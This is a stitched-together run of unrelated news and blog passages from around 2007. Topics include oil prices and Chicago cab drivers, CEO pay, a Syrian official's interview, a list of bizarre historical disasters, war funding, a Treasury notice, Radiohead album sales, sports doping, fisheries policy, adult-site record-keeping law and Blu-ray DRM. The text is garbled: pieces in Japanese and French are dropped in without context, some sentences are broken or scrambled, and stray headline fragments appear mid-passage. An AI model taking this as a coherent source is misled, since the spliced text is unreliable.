The U.S. and other oil - importing nations risk accelerating inflation , while higher energy costs threaten to restrain growth .
Benchmark crude oil futures ended last week at $ 75.57 a barrel on the New York Mercantile Exchange , up 51 percent since mid- January and twice the level of early 2003 .
A record number of options have been sold that give the buyer the right to buy crude oil at $ 100 .
The contracts , covering 50 million barrels , only pay off should oil go above the target price .
A National Petroleum Council study led by former Exxon Mobil chairman Lee Raymond , released last week , predicted a growing gap between production and demand for oil and gas during the next two decades .
As recently as 2005 , Raymond said oil prices had probably peaked and dismissed the possibility that supply and demand could not be brought back into balance .
" There are questions about whether the oil industry can keep up with demand , " U.S. Energy Secretary Samuel Bodman said last week , commenting on the Petroleum Council report .
Oil prices could triple in three months to more than $ 200 a barrel , given the right circumstances , according to Matthew Simmons , chairman of Simmons & Co. , a Houston investment bank .
Gasoline pump prices averaging more than $ 3 a gallon across the U.S. , the consumer of 25 percent of the world 's oil , have n't dented sales .
Deliveries of gasoline were a record 9.23 million barrels a day in the first half of this year , according to a July 18 report from the American Petroleum Institute in Washington .
" It appears that high prices are acceptable to the American consumer , " said Robert Ebel , chairman of the energy program at the Center for Strategic and International Studies in Washington .
" People want the house with a yard and white - picket fence so they are moving further and further out of the cities .
They have to just get up earlier and drive further . "
A pullout from Iraq may be the event that pushes oil to $ 100 a barrel , according to Boone Pickens , the Dallas hedge fund manager who has joined Forbes Magazine 's list of billionaires because of his bullish bets on energy prices .
Pickens predicted a year ago that $ 100 oil would probably occur by now .
Today he is looking for $ 80 within six months , and he says growing chaos in Iraq would be a bad sign .
" That could run prices pretty high , " he said .
Goldman Sachs 's Currie also notes similarities to a year ago , with global inventories at about the same level and U.S. government data showing an increasing bet on higher prices .
" At face value this market is strikingly similar to a year ago , " Currie said .
" What is different ?
Supply is down a million barrels a day , demand is up a million barrels a day .
The market is in a deficit . "
Gasoline Demand Is Inelastic
high prices are acceptable to the American consumer
His fares for the last two days were dismal and now halfway through the day , Khalid al Hag had only $ 20 in his pocket .
At this rate , he figured he would have to dip into savings to make his $ 520 weekly payment to the cab company for use of the car .
" I 'm going to have to work at least 12 or 14 hours today and still I wo n't get by , " he said , gulping down a meal so he could get back into his cab , which lately he has been driving seven days a week .
Other cabbies -- independents who have to pay out of their pockets for gasoline and other expenses and benefits -- flitted through the restaurant with the same laments .
At $ 3.46 for a gallon of regular gas , high fuel prices are swallowing their thin profit margins .
The drivers ' distress is why Sampat thinks an effort to organize many of Chicago 's nearly 11,000 cab drivers , including 2,500 who own their own cabs , will succeed .
Similar efforts are ongoing across the country .
The organizing efforts are more of a cry for rights and recognition waged largely on behalf of thousands of immigrants who have quietly slipped behind the steering wheels of most the nation 's cabs .
Why are cabbies the focus of organizing efforts ?
Taxis are today 's Ellis Island for many immigrants , statistics show .
And cab driver is the first line of work in the U.S. for many without good language skills and without credentials to land easier , safer and better - paying jobs .
The last fare hike in Chicago was in 2005 .
Soon after that , Chicago ranked 18th out of 23 cities in the U.S. for the price of an average cab ride , according to an industry study that city officials said still is relevant .
The organizers presented figures compiled from a handful of drivers , showing that the drivers were spending an average $ 44 a day on gas last month and were earning $ 6 an hour when all of their expenses were deducted .
But Ald. Thomas Allen ( 38th ) , chairman of the Committee on Transportation and Public Way , said he does n't sense any support within the City Council or from city officials for a surcharge .
" Gas prices have kind of settled , " he added .
" Every day when I go home , I ask myself the same question , ' When am I going to stop being a cab driver ? '
And every day I say I 'm going find something better , but I can't , " grumbled Omar Shire , 29 , a Somali refugee , who has been driving for the last three years in Chicago .
" I work 14 hours a day , seven days a week .
That 's all I do , " he said , his voice rising in anger , his eyes wide .
The city does not limit how many hours cabbies can drive .
Monthly Crude Trendline Still Intact
US $ Index
Yen / US Dollar
If Bush is dumb enough to invade Iran , $ 200 could come in a hurry .
But the idea that oil surges on a U.S. pullback from Iraq is debatable .
The sooner we leave Iraq , the sooner Iraq will recover ( I might add just as Vietnam did ) , and the less jet fuel we will be wasting on needless missions .
Could there be a short term spike when we leave Iraq ?
Perhaps , but the long term benefits of us getting the hell out will be enormous .
It 's not so much that " " as opposed to the fact that the demand for gasoline is relatively inelastic .
Consider the plight of taxi drivers and the Chicago Tribune article Pinched taxi drivers hope to fare better by organizing Is there a real choice here ?
The bottom line is you have to drive and you have to eat .
While one can cut back eating expenses by switching from steak to hot dogs , there is no cheaper substitute for gasoline .
The weekly chart has had a few busted trendlines but the monthly still looks great .
But there is a looming US recession and liquidity crunch that is likely to bust an enormous number of trendlines and test the resolve of more than a few energy bulls .

Forex traders will note that the chart of the Yen vs. the dollar is inverse of normal trading pairs .
It 's now do or die for both the US $ index and the Yen vs. the US dollar .
Both currencieshave been anemic lately compared to anything else .
The US $ is on the verge of collapse , and the Yen is at lows compared to the British Pound and the Euro .
With trillions in carry trade bets riding on the outcome , the impact of a major breakdown in either currency could be very significant .
Out and out disasters are most often in the direction of the prevailing trend .
Here , two competing losers also are going head to head .
Resolution should come soon .
The US dollar is going to eventually break hard but one must be on the lookout for a major headfake with all the stops in too obvious places .
Mike Shedlock / Mishhttp://globaleconomicanalysis.blogspot.com/
I ’ve long been a member of the “ chief executives make too much ” school .
I think executive compensation is a socially corrosive issue , especially when the middle class is struggling .
I think it creates morale problems when the C.E.O. makes so much more than even other top executives .
But what offends me most is a somewhat different issue : that the market for executive compensation is so clearly rigged .
Chief executives sit on one another ’s boards , so they have an incentive to take care of one another .
Directors are predisposed to want to make the chief executive happy since , after all , he or she is the one who picked them for the board .
Far too often , a chief executive ’s pay is n’t a result of an arms - length negotiation , but a result of a kind of a corporate buddy system .
Mr. Kay , of course , insists that there is a real market for C.E.O. pay — rather than the rigged market I just described — though he does grant that “ C.E.O. ’s have relative power compared to their boards . ”
He can cite statistic after statistic , using such measures as “ realizable long - term incentive pay , ” showing that high - performing chief executives put more money in their pockets than those whose companies do poorly .
But what struck me in speaking to him was the way in which he himself seemed to acknowledge that , at long last , the game itself was becoming at least a little less rigged .
The constant clamor by institutional investors has had an effect on boards , he said .
What ’s more , “ boards are starting to play hardball on severance , pensions and perquisites . ”
He added , “ It is a strategic shift in the labor market , because these goodies used to come with the package . ”
Indeed , he told me he had begun recommending to boards that the severance packages for chief executives , which have been such a source of controversy , be pared back , especially for chief executives who have been on the job for a while and have reaped considerable compensation rewards .
Two companies , he added , had agreed to do so — though he declined to identify them .
( They ’re clients after all . )
A few days after he spoke to me , Mr. Kay spoke at a conference run by Jesse M. Brill , one of the loudest executive compensation critics and publisher of CompensationStandards.com .
When I spoke to Mr. Brill the day before the conference , he was practically beside himself with excitement — Mr. Kay , he told me , was going to publicly denounce outsize , and unnecessary , severance packages .
“ It ’s a very big deal , ” he said .
And it could be — if it leads other compensation consultants to follow his lead , and boards to begin rethinking big severance packages for C.E.O. ’s who have either failed to perform or have been in the job so long they have already reaped tremendous rewards .
But it ’s also just a start .
What we really need is confidence that boards are finally treating the shareholders ’ money as if it were their own — and negotiating as fiercely as , say , Theo Epstein of the Boston Red Sox negotiates with Scott Boras , the famous player ’s agent .
Which leads to one last thought exercise .
Baseball players also make outsize salaries , as do actors and rock stars .
You could easily make the argument that their pay is also socially corrosive — part of the growing gap between rich and poor — and even unfair given how little teachers make by comparison .
But even many of the same people who think C.E.O. ’s are paid too much do n’t take the same position about these other highly paid professions .
Why not ?
The reason , I ’m convinced , is that we feel confident that they are being paid what the market says they ’re worth .
Their compensation has been set by a real market , not a rigged one .
And markets , in the end , are n’t moral or immoral .
They just are .
We accept their judgment .
" Damascus will retaliate , " Syrian Vice President Farouk al - Shara said Saturday in an interview with Italian newspaper Le Repubblica following Israel 's reported violation of Syrian airspace on Thursday .
Asked what the response would be , al - Shara replied , " I can not reveal the details , as this is an issue of national security .
All I can say is that the military and political echelon is looking into a series of responses as we speak .
Results are forthcoming . "

Jettisoned fuel tanks discovered late Thursday , hours after Damascus accused Israel of bombing its territory Turkey quizzes Israel on warplane fuel tanks
The Syrian vice president took advantage of the interview in order to slam the US - sponsored Middle East peace conference scheduled to take place in November .
" The conference will not advance peace , because Washington does not really view it as important , and has turned it into a photo opportunity , aimed at diverting the attention from Iraq .
" Meanwhile , an unprecedented arms race has been launched in the Middle East , increasing the risk of new military adventures , such as Israel 's in Syria two days ago .
Syria will retaliate for this violation . "
Asked about President Shimon Peres ' appeal to Syria , speaking of his hopes for peace , al - Shara replied , " Excuse me for smiling .
The talks about peace are a disguise for blatant aggression .
Moreover , Israel 's responses in light of the aircraft 's infiltration are amazing , with ( Prime Minister Ehud ) Olmert saying he knows nothing about it .
" This creates the impression that Israel has a week government , which is unable to take courage and follow the road of peace , accepting the Arab world 's offer which was approved unanimously . "
The Syrian vice president argued that Israel was to blame for the failure of negotiations .
" Those who try to cast the blame on Syria forget that we took part in the negotiations for 10 years .
We were not the ones who ended the talks .
Let history bear witness to that . "
' Washington leading unprecedented arms race '
Asked whether Damascus would take part in the peace conference if were invited , al - Shara replied , " Italy knows that only an overall solution could succeed .
The current plan is vague .
There is no list of the countries invited , and not even a date .
There is an agreement that Washington will limit the conference to a photo opportunity in order to divert the attention from Iraq .
" And Israel is not cooperating .
It 's not saying whether it will accept the UN resolutions , the principle of land for peace .
As for our role , both Prime Minister Prodi and Foreign Minister D'alema have reiterated Kissinger 's motto : ' Without Syria there is no peace . ' "
" But there is also no war , " the La Repubblica reported said , noting that Syria was arming itself .
" Washington is leading an arms race in the Middle East , which is unprecedented even compared to the Cold War era , " al - Shara responded .
" Some $ 30 million in military aid to Israel only .
This is not an encouraging sign .
The White House is favoring a military conflict over diplomacy and international law . "
Addressing his meeting with the pope , al - Shara said , " There is an agreement on Lebanon between Syria and the Holy See that there is need for a president who will be able to create a consensus between everyone and will be elected according to the constitution by two - thirds of the parliament . "
Italy , France and the United States have asked Syria not to interfere in Lebanon .
" They may be asking us to ease the solution , and we will do that by encouraging the parties to reach a consensus , " al - Shara said .
" We are interested in stabilizing Lebanon , as well as Iraq . "
Iran recently stated that it would be willing to help Syria if asked to .
Is this alliance convenient to Damascus ?
" The relations with Iran are very tight .
There is no reason to fear Iran .
The realistic solution for the Iranian crisis is a Middle East free of nuclear weapons .
We suggested this to the UN four years ago and were backed by the Arab League .
And Iran agrees to this .
The only one opposed to it is Israel .
A Middle East without nukes will serve peace worldwide , " al - Shara concluded .

In what is an elite tweak on home schooling — and a throwback to the gilded days of education by governess or tutor — growing numbers of families are choosing the ultimate in private school : hiring teachers to educate their children in their own homes .
Unlike the more familiar home - schoolers of recent years , these families are not trying to get more religion into their children 's lives , or escape what some consider the tyranny of the government 's hand in schools .
In fact , many say they have no argument with ordinary education — it just does not fit their lifestyles .

Through history , there have been some dreadful disasters leading to enormous numbers of deaths .
There have also been a number of disasters that were just outright weird .
This is a list of those ten most bizarre disasters .
10 The St. Pierre Snake Invasion
Volcanic activity on the ‘ bald mountain ’ towering over St Pierre , Martinique , was usually so inconsequential that no one took seriously the fresh steaming vent - holes and earth tremors during April , 1902 .
By early May , however , ash began to rain down continuously , and the nauseating stench of sulphur filled the air .
Their homes on the mountainside made uninhabitable , more than 100 fer - de- lance snakes slithered down and invaded the mulatto quarter of St Pierre .
The 6 - ft long serpents killed 50 people and innumerable animals before they were finally destroyed by the town ’s giant street cats .
But the annihilation had only begun .
On May 5 , a landslide of boiling mud spilled into the sea , followed by a tsunami that killed hundreds and , three days later , May 8 , Mt Pelee finally exploded , sending a murderous avalanche of white - hot lava straight toward the town .
Within three minutes St Pierre was completely obliterated .
Of its 30,000 population , there were only two survivors .

9 The Shiloh Baptist Church Panic
Advertisement
Two thousand people , mostly black , jammed into the Shiloh Baptist Church in Birmingham , Alabama , on September 19 , 1902 , to hear an address by Booker T. Washington .
The brick church was new .
A steep flight of stairs , enclosed in brick , led from the entrance doors to the church proper .
After Washington ’s speech , there was an altercation over an unoccupied seat , and the word ‘ fight ’ was misunderstood as ‘ fire ’ .
The congregation rose as if on cue and stampeded for the stairs .
Those who reached them first were pushed from behind and fell .
Others fell on top of them until the entrance was completely blocked by a pile of screaming humanity 10 ft high .
Efforts by Washington and the churchmen down in the front to induce calm were fruitless , and they stood by helplessly while their brothers and sisters , mostly the latter , were trampled or suffocated to death .
There was neither fire – nor even a real fight – but 115 people died .
8 The Great Boston Molasses Flood
On January 15 , 1919 , the workers and residents of Boston ’s North End , mostly Irish and Italian , were out enjoying the noontime sun of an unseasonably warm day .
Suddenly , with only a low rumble of warning , the huge cast - iron tank of the Purity Distilling Company burst open and a great wave of raw black molasses , two storeys high , poured down Commercial Street and oozed into the adjacent waterfront area .
Neither pedestrians nor horse - drawn wagons could outrun it .
Two million gallons of molasses , originally destined for rum , engulfed scores of people – 21 men , women and children died of drowning or suffocation , while another 150 were injured .
Buildings crumbled , and an elevated train track collapsed .
Those horses not completely swallowed up were so trapped in the goo they had to be shot by the police .
Sightseers who came to see the chaos could n’t help but walk in the molasses .
On their way home they spread the sticky substance throughout the city .
Boston smelled of molasses for a week , and the harbour ran brown until summer .
7 The Pittsburg Gasometer Explosion
A huge cylindrical gasometer – the largest in the world at that time – located in the heart of the industrial centre of Pittsburgh , Pennsylvania , developed a leak .
On the morning of November 14 , 1927 , repairmen set out to look for it – with an open - flame blowlamp .
At about 10 o’clock they apparently found the leak .
The tank , containing 5 million cu. ft of natural gas , rose in the air like a balloon and exploded .
Chunks of metal , some weighing more than 100 lbs , were scattered great distances , and the combined effects of air pressure and fire left a square mile of devastation .
Twenty - eight people were killed and hundreds were injured .
6 The Gillingham Fire Demonstration
Every year the firemen of Gillingham , in Kent , England , would construct a makeshift ‘ house ’ out of wood and canvas for the popular fire - fighting demonstration at the annual Gillingham Park fête .
Every year , too , a few local boys were selected from many aspirants to take part in the charade .
On July 11 , 1929 , nine boys – aged 10 to 14 – and six firemen costumed as if for a wedding party , climbed to the third floor of the ‘ house ’ .
The plan was to light a smoke fire on the first floor , rescue the ‘ wedding party ’ with ropes and ladders , and then set the empty house ablaze to demonstrate the use of the fire hoses .
By some error , the real fire was lit first .
The spectators , assuming the bodies they saw burning were dummies , cheered and clapped , while the firemen outside directed streams of water on what they knew to be a real catastrophe .
All 15 people inside the house died .
5 The Empire State Building Crash
On Saturday morning , July 28 , 1945 , a veteran Army pilot took off in a B - 25 light bomber from Bedford , Massachusetts , headed for Newark , New Jersey , the co-pilot and a young sailor hitching a ride were also aboard .
Fog made visibility poor .
About an hour later , people on the streets of midtown Manhattan became aware of the rapidly increasing roar of a plane and watched with horror as a bomber suddenly appeared out of the clouds , dodged between skyscrapers , and then plunged into the side of the Empire State Building .
Pieces of plane and building fell like hail .
A gaping hole was gouged in the 78th floor , one of the plane ’s two engines hurtled through seven walls and came out the opposite side of the building , and the other engine shot through an elevator shaft , severing the cables and sending the car plummeting to the basement .
When the plane ’s fuel tank exploded , six floors were engulfed in flame , and burning gasoline streamed down the sides of the building .
Fortunately , few offices were open on a Saturday , and only 11 people – plus the three occupants of the plane – died .
4 The Tunguska Event
On June 30 , 1908 , a huge explosion occurred near the Podkamennaya ( Under Rock ) Tunguska River in what is now Krasnoyarsk Krai of Russia .
The airburst was most likely caused by a meteor or comet fragment about 20 m ( 60 ft ) across .
Although the meteor or comet is considered to have burst prior to hitting the surface , this event is still referred to as an impact event .
The energy of the blast was estimated to be between 10 and 20 megatons of TNT , 1,000 times more powerful than the bomb dropped on Hiroshima , or equivalent to Castle Bravo , the most powerful nuclear bomb ever detonated by the US .
The Tunguska explosion felled an estimated 80 million trees over 2,150 square kilometers ( 830 sq mi ) .
The devastation is still visible today in satellite images of the area .
3 The Texas City Chain Reaction Explosions
On April 15 , 1947 , the French freighter Grandcamp docked at Texas City , Texas , and took on some 1,400 tons of ammonium nitrate fertiliser .
That night a fire broke out in the hold of the ship .
By dawn , thick black smoke had port authorities worried because the Monsanto chemical plant was only 700 ft away .
As men stood on the dock watching , tugboats prepared to tow the freighter out to sea .
Suddenly a ball of fire enveloped the ship .
For many it was the last thing they ever saw .
A great wall of flame radiated outward from the wreckage , and within minutes the Monsanto plant exploded , killing and maiming hundreds of workers and any spectators who had survived the initial blast .
Most of the business district was devastated , and fires raged along the waterfront , where huge tanks of butane gas stood imperilled .
Shortly after midnight , a second freighter – also carrying nitrates – exploded , and the whole sequence began again .
More than 500 people died , and another 1,000 were badly injured .

2 The Basra Mass Poisoning
In September 1971 a shipment of 90,000 metric tons of seed grain arrived in the Iraqi port of Basra .
The American barley and Mexican wheat – which had been chemically treated with methyl - mercury to prevent rot – were sprayed a bright pink to indicate their lethal coating , and clear warnings were printed on the bags – but only in English and Spanish .
Before they could be distributed to the farmers , the bags were stolen from the docks , and the grain was sold as food to the starving populace .
The Iraqi government , embarrassed at its criminal negligence or for other reasons , hushed up the story , and it was not until two years later that an American newsman came up with evidence that 6,530 hospital cases of mercury poisoning were attributable to the unsavoury affair .
Officials would admit to only 459 deaths , but total fatalities were probably more like 6,000 , with another 100,000 suffering such permanent effects as blindness , deafness and brain damage .
1 The Chandka Forest Elephant Stampede
In the spring of 1972 , the Chandka Forest area in India – already suffering from drought – was hit by a searing heat wave as well .
The local elephants , who normally were no problem , became so crazed by the high temperatures and lack of water that the villagers told authorities they were afraid to venture out and to farm their land .
By summer the situation had worsened .
On July 10 , the elephant herds went berserk and stampeded through five villages , leaving general devastation and 24 deaths in their wake .

WASHINGTON , Sept. 22  The Bush administration plans to increase its 2008 financing request for military operations in Iraq , Afghanistan and elsewhere by almost $ 50 billion , with about a quarter of the additional money going toward armored trucks built to withstand roadside bombs , Pentagon officials said Saturday .
The increase would bring the amount the administration is seeking to finance the war effort through 2008 to almost $ 200 billion .
Much of that money will go to refurbishment of military equipment and to the purchase of new protective equipment for troops , officials said , an indication of the toll that years of combat in Iraq and Afghanistan have taken on military vehicles , aircraft , weapons and other items .
Defense officials said earlier this year that the Pentagon would need a war budget of $ 141 billion in the fiscal year beginning Oct.
1 . The additional request for nearly $ 50 billion , which was first reported in The Los Angeles Times on Saturday , will be presented by Defense Secretary Robert M. Gates during a Senate Appropriations Committee hearing on Wednesday , the Pentagon said .
Deputy Secretary of State John D. Negroponte and senior military officials are also expected to attend the hearing .
Mr. Gates is to testify two weeks after Gen. David H. Petraeus , the top commander in Iraq , went before Congress to warn against a rapid reduction of troops in Iraq , and a week after a Democratic effort to limit troop rotations stumbled in the Senate .
The financing request may serve to further sharpen partisan divisions over the Iraq war in general , and its soaring cost in particular .

Treasury Suspends Sales Of State And Local Government Series Securities
FOR IMMEDIATE RELEASE
September 21 , 2007
The Treasury Department announced the suspension of sales of State and Local Government series ( SLGS ) nonmarketable Treasury securities until further notice , effective as of 3:00 p.m. , Eastern Daylight Time , Thursday , September 27 , 2007 .
This suspension is necessary because the statutory debt ceiling has not been raised .
The suspension will facilitate Treasury 's management of the debt subject to limit .
The suspension applies to demand deposit and time deposit securities .
Subscriptions for SLGS received by the Bureau of the Public Debt prior to 3:00 p.m. , EDT , September 27 , 2007 , will be issued on the date requested .
New subscriptions for SLGS will not be accepted until the suspension is lifted .
Consistent with our past practice , any unredeemed demand deposit securities as of September 27 , 2007 , will be invested in special 90 - day certificates of indebtedness .
These certificates will earn simple interest equal to the demand deposit daily factor in effect on September 27 , 2007 , and may be redeemed prior to maturity according to the same redemption lead time requirements applicable to demand deposit securities .
If the debt ceiling is raised and the suspension of sales lifted prior to the maturity date of the special 90 - day certificates of indebtedness , the certificates and any accrued interest will be automatically converted back to demand deposit securities , unless the owner advises that it chooses to retain them until maturity or redeem them early .
This conversion process does not require any action on the part of demand deposit security holders .
The Internal Revenue Service has issued guidance to affected entities in Revenue Procedure 95 - 47 , 1995 - 47 I.R.B. 12 , which is available at www.irs.gov/bonds by selecting the Revenue Procedures link under " TEB Published Guidance . "

エベン・モグレンの OSCON の主催者であるオライリーに対する態度が失礼だった上に、何より本題についてちゃんと議論できなかったようだ。

LONDON --
It is crunch time for many of the world 's biggest banks grappling with one of the tightest credit markets of recent memory .
About $ 120 billion of commercial paper outside the U.S. is due for renewal in the next week , including $ 56.5 billion of asset - backed paper , which has met the stiffest resistance from investors .
Issuers need to find buyers in order to roll over these short - term funding mechanisms or pay off the loans .
So banks and other issuers are pulling out all stops to lure investors back .
In the meantime , ...
C’était l’époque du lancement du système d’authentification Passport , que l’on utilise pour se connecter à Hotmail et les débuts du DRM .
Le sujet fait toujours couler autant d’encre .
Mais la réalité est qu’il ne gêne pas la vie courante de la majorité des utilisateurs .
What ’s next ?
En fait , il est bien trop tôt pour juger de l’avenir et du succès de Windows Vista .
La perspective à prendre en compte est au minimum de trois années après son lancement pour intégrer les premiers déploiements dans les grandes entreprises .
Leur vitesse ne pourra se mesurer qu’à cette échéance .
Et grâce aux ventes OEM de Windows qui représentent on l’a vu l’essentiel du revenu pour ce produit , Microsoft a une manne de revenu assurée .
Microsoft peut par ailleurs redresser la barre sur les aspects produits évoqués ici .
Le futur Service Pack 1 apportera peut - être quelques améliorations et corrections .
Il serait bon que l’éditeur montre de manière plus visible qu’il prend en compte les besoins de ses utilisateurs , et qu’il le fait rapidement .
Sinon , une nouvelle version de Vista est prévue dans 2 ans mais la “ roadmap ” n’est pas encore connue du grand public .
Et parallèle , Microsoft investit beaucoup sur les “ Software as a service ” et le les liens entre Windows Vista et ses services en ligne Windows Live .
Car il n’y a pas que les OS dans la vie .
Les services Internet sont là où se situent les principales innovations récentes .
Un autre espace où Microsoft se doit d’être présent .
Et où l’éditeur reste d’ailleurs juste un challenger dans la plupart des domaines qu’il y occupe , sauf dans la messagerie et la messagerie instantanée .
Affaire à suivre …
Thom Yorke 's representative told me that the band have " decided not to give out any figures " for sales of Radiohead 's
In Rainbows album , but that is n't stopping people from making their best guesses based on what little information is available .
The Seminal estimates that Radiohead sold about $ 10 million - worth of albums as of 10 / 12 , assuming Gigwise was correct that approximately 1.2 million people downloaded the album from the site and that the average price paid per album was $ 8 .
We heard that figure too , but also heard that a later , more accurate average was $ 5 , which would lower the figure to $ 6 million .
But Gigwise 's anonymous source may not have meant that all 1.2 million people who downloaded the album in the first three days Radiohead 's site paid for it .
ComScore said 60 percent of downloaders did n't pay , which could bring that revenue figure down to $ 2.4 million .
A Radioheadrepresentative said ComScore 's percentage was inaccurate , so Radiohead 's exact sales numbers remain shrouded in secrecy .
However , an inside source tells us that details could be released as the band gears up for its next tour .
Meanwhile , Forbes and BigChampagne revealed that on the first day the album was available , 240 K people downloaded it for free over BitTorrent , and that over the following days an average of 100 K people per day did the same , for a total of over 500K BitTorrent downloads over the initial week of its release .
It appears that even though the album was available for free on InRainbows.com , plenty of people preferred to use BitTorrent rather than Radiohead 's site , which required an email registration ( although some of those BitTorrent downloads may have been the result of slowdowns on the ordering site ) .

Why Legalizing Sports Doping Wo n’t Work
Yesterday , I posted a short piece called “ Should We Just Let the Tour de France Dopers Dope Away ? ”
It was n’t an outright call for legalization of sports doping , but I wanted to put the idea on the table .
Well , Joe Lindsey , a contributing writer for Bicycling magazine , wrote in to say that there are a lot of compelling reasons to keep the idea off the table .
Joe , who has written widely on doping in cycling , was good enough to write up his argument in the guest post below .
Guest Blog
Why Legalizing Sports Doping Wo n’t Work
by Joe Lindsey
The irony of the recent report that the Olympics are considering kicking out cycling because of its doping probems is that it was then - International Olympic Committee president Juan Antonio Samaranch who floated the idea in 1997 of a “ gladiator class ” of sports – where doping was acknowledged and allowed .
It ’s worth considering , as the Tour de France practically grinds to a halt as one after another top competitor is removed from the race under suspicion of doping , whether we might just throw the doors of the pharmacy wide open and say have at it .
“ Pure cycling is just an illusion , ” said Francesco Moser once .
Moser is a former top cyclist who now heads the professional riders ’ union .
“ There comes a stage when a rider must be told the effects of a medicine .
Then if he wants to , let him take it . ”
Or is that such a good idea ?
If we play Prometheus to cycling ’s mortals , what happens ?
First , let ’s set aside two logistical problems .
One , not all cyclists dope , nor do they want to .
Jonathan Vaughters , a former pro who now runs a domestic cycling team called Slipstream Sports , which performs its own anti-doping testing , has characterized the doping dynamic as the dragged and the draggers .
( This is an unpublished quote from a personal interview with Vaughters for a Men ’s Journal article on Floyd Landis . )
The vast majority of cyclists who would prefer to race clean ( the dragged ) are instead tempted to dope simply to keep up with the small minority who aggressively dope for a competitive advantage ( the draggers ) .
Modern oxygen - vector doping is so effective , a rider has two choices : dope and keep up , or stay clean and fall behind .
“ I guess , after years and years and years of standing on the start line and feeling like I was a mile behind , it finally got to me , ” said nine - time Tour finisher Frankie Andreu of the experience .
Andreu succumbed , temporarily .
( This is from a Dec. 2006 Men ’s Journal article , not available online . )
But it is possible to race and even win clean , if you ’re smart and work hard .
So some racers never dope , even if their careers suffer for it .
But if most riders want to race clean , then legalizing doping puts them in an impossible position : dope , or quit the sport .
Second , not all doping techniques are created equal .
The most effective regimens are also the most sophisticated and expensive – according to a der Spiegel interview , German pro Jorg Jaksche paid 37,000 Euros one year for a “ medical program ” that was slightly less than comprehensive .
Star riders such as Tyler Hamilton and Jan Ullrich are alleged to have paid 50,000 Euro or more , a substantial chunk of the average pro racer ’s contract but a mere tithe to riders of Hamilton and Ullrich ’s salary range .
So if doping is legalized , the sport ’s richest riders and teams will have access to techniques that lesser lights do n’t .
The playing field , never level , would be tilted permanently .
If you can somehow manage to get past those two little hurdles , there is a third , much more formidable one : what to legalize , and how to enforce it ?
One of the serious allegations against Michael Rasmussen , who was yanked from the Tour while leading the race , is that in 2002 , he attempted to use a synthetic blood substitute called Hemopure .
We ca n’t legalize Hemopure for sporting use .
It ’s only approved for human medical use in one country : South Africa .
If you transport it to or use it in France , Italy , the United States or virtually any other country outside of a government - approved clinical trial , you ’re breaking federal law on the transport and possession of controlled substances .
Trenbolone , which Game of Shadows authors Mark Fainaru - Wada and Lance Williams say Barry Bonds used , is a veterinary - only product , intended for use in cattle .
Do n’t even mention designer steroids like BALCO ’s infamous The Clear .
Medical laws and medical ethics prevent us from letting athletes use these substances outside of a clinical trial .
But athletes , who eagerly seek out anything that will give them a competitive edge , will still try and get them .
H. Lee Sweeney , a professor at the University of Pennsylvania , was shocked when , after publishing research in an obscure scholarly journal on an experimental gene therapy technique to inhibit myostatin ( as a therapy for muscular dystrophy ) , he began receiving inquiries from athletes , and even a high - school wrestling coach , on how to use the technique to boost performance .
Simply put , wherever you draw the line , something , some technique or substance , will always be off - limits .
And so you ’ve merely moved the line , not erased it .
Finally , none of that addresses the moral problems involved in legalizing doping .
Doping in sports is n’t inherently wrong ; it ’s wrong by the value system with which we judge sports .
Sports themselves are by their nature civilized : everyone agrees to follow a certain set of rules .
If you do n’t , that ’s cheating .
Legalizing doping does n’t change those rules as much as remove them altogether , and then it ’s no longer a sport , but merely entertainment .
Right or wrong , we look to sports and to athletes for an inspiration that mere entertainment cannot provide – there is an implicit contract that the sweat and effort we see before us is real and natural .
Do you want to see who ’s the best athlete , or just who had the best access to pharmaceutical enhancement ?

On Saturday , President Bush visited the Chesapeake Bay Maritime Museum in St. Michaels , Maryland , to sign an Executive Order to protect America ’s striped bass and red drum fish populations from over - fishing .
The executive order moves to prohibit the sale of striped bass and red drum caught in federal waters .
To improve the quality of our data , a recreational saltwater registry will collect information from sportsmen about local fish stocks .
Federal agencies will work with state officials to implement innovative conservation measures , including the use of the state designation of “ gamefish , ” to prohibit commercial sales of the fish .
Saturday ’s action follows the president ’s signing in January of the Magnuson - Stevens Fisheries Conservation and Management Act .
This legislation has set a deadline to end over - fishing in America , which occurs when we catch fish from a species at a rate faster than they are reproducing , by 2011 , and has authorized “ limited access privilege programs ” to set market - based incentives to help replenish our fish stocks .
The 2008 White House budget includes $ 143 million to support the Ocean Action Plan priorities to protect and restore coastal and marine areas , including $ 8 million for the Papahanaumokuakea Marine National Monument ; $ 25 million to end over - fishing and ensure sustainable use of ocean resources ( $ 6 million to implement Limited Access Privilege Programs ) ; and $ 80 million to advance ocean science and research .
The White House says major improvements have been made in the management of marine fisheries .
Important stocks such as Atlantic sea scallops and swordfish have been returned to productive levels .
Since 2001 , 29 stocks have been removed from the over - fished list , and rebuilding plans are in place for the more than 90 percent of the remaining over - fished stocks .

Social networking did n't just revolutionize the way we interact online ( and caused a lot of very , very ugly profiles to appear ) ; it has also revolutionized porn .
Believe it or not , YouPorn [ link obviously NSFW ] , a site that lets its users post erotic / pornographic images and videos of themselves is currently the most visited adult site out there .
It 's bigger than CNN , and that 's a lot of traffic .
But , the proposed changes to a US law 18 U.S.C. 2257 might be the end of sites like YouPorn , because they would require every performer ( this would include social networks like YouPorn ) to disclose about his / her age and identity .
Want to post that raunchy picture of you and your girlfriend in the bathroom ?
Your ID , please .
Of course , this would probably not sit well with many users - hell , let 's be honest here , it would n't sit well with anyone .
It would also pose a great deal of problems for the network owners , which would have to maintain records on every single picture or video on the network , and that 's a lot of database records .
Basically , it 's probably down right impossible for adult social networks to comply with these changes , and if the new changes are accepted into law , " interesting " times await ahead for YouPorn and similar sites .

One upon a time in a galaxy far , far away , most consumer products were expected to work " off the shelf " and did n't require frequent " firmware updates " to do so .
With the new generation of HD DVD and Blu-ray video players , however , this is the norm : firmware updates are to be expected because the players are constantly evolving and are built around a DRM scheme ( AACS ) that can be " updated " in the event that a hack is found .
Blu -ray goes one step further and adds another layer of anti-copy technology known as BD + , but the latter is only now starting to be used .
As it turns out , it appears that it 's causing problems for many honest customers .
Case in point : two new Blu-ray titles that have just been released — Fantastic 4 : Rise of the Silver Surfer and The Day After Tomorrow .
Both of these titles have been reported to exhibit various degrees of failure on some Blu-ray players .
Some refuse to play until after an interminable two - minute delay , others skip randomly making watching the movie futile , and then there is this gem :
Thank you , DRM .

How nice of Fox to include a link to their web site in this helpful and friendly message !
Unfortunately for the owners of the player in question , the second - generation Samsung BD - P1200 , there is no new firmware to download for the player .
Visiting the URL listed above — which after a maze of redirects and confusing menus finally does get you to Samsung 's BD - P1200 firmware page — will give you no satisfaction .
The latest firmware listed there is the same 1.0 version that shipped with the player .
